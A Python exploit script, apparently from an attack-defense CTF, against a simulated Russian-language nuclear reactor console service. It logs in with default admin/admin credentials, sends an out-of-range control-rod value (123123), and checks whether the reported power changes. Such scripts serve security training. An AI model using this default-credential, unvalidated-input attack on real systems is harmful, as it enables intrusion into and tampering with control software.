import re
import asyncio
from colorama import Fore, Style


async def extract_and_compare_power(ip, port):
    rods_position = 123123

    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=10)

        await reader.readuntil("Введите имя пользователя: ".encode('utf-8'))
        writer.write("admin\n".encode('utf-8'))
        await writer.drain()

        await reader.readuntil("Введите пароль: ".encode('utf-8'))
        writer.write("admin\n".encode('utf-8'))
        await writer.drain()

        await reader.readuntil(b"> ")

        writer.write("reactor_status\n".encode('utf-8'))
        await writer.drain()
        response = await reader.readuntil(b"=============================")
        response_text = response.decode('utf-8')

        match = re.search(r"Выходная мощность:\s+([\d.]+)\s+МВт", response_text)
        if not match:
            writer.close()
            await writer.wait_closed()
            print(Fore.RED + f"[-] Sploit 2 (Nuclear): {ip}:{port} - output power response failed" + Style.RESET_ALL)
            return 102, None

        initial_power = float(match.group(1))

        writer.write("adjust_rods\n".encode('utf-8'))
        await writer.drain()

        await reader.readuntil("Введите новое положение управляющих стержней (0-100%): ".encode('utf-8'))
        writer.write(f"{rods_position}\n".encode('utf-8'))
        await writer.drain()

        await reader.readuntil(b"> ")

        writer.write("reactor_status\n".encode('utf-8'))
        await writer.drain()
        response = await reader.readuntil(b"=============================")
        response_text = response.decode('utf-8')

        match = re.search(r"Выходная мощность:\s+([\d.]+)\s+МВт", response_text)
        if not match:
            writer.close()
            await writer.wait_closed()
            print(Fore.RED + f"[-] Sploit 2 (Nuclear): {ip}:{port} - reactor power response failed" + Style.RESET_ALL)
            return 102, None

        updated_power = float(match.group(1))

        writer.close()
        await writer.wait_closed()

        if initial_power != updated_power:
            print(Fore.GREEN + f"[+] Sploit 2 (Nuclear): {ip}:{port} - reactor power (2) response successfull" + Style.RESET_ALL)
            return 101, None
        else:
            print(Fore.RED + f"[-] Sploit 2 (Nuclear): {ip}:{port} - reactor power (2) response failed" + Style.RESET_ALL)
            return 102, None
    except:
        print(Fore.RED + f"[-] Sploit 2 (Nuclear): {ip}:{port} - reactor sploit response failed" + Style.RESET_ALL)
        return 110, None


async def pwn(HOST):
    VERDICT = await extract_and_compare_power(HOST, 9000)
    print(VERDICT)
    return VERDICT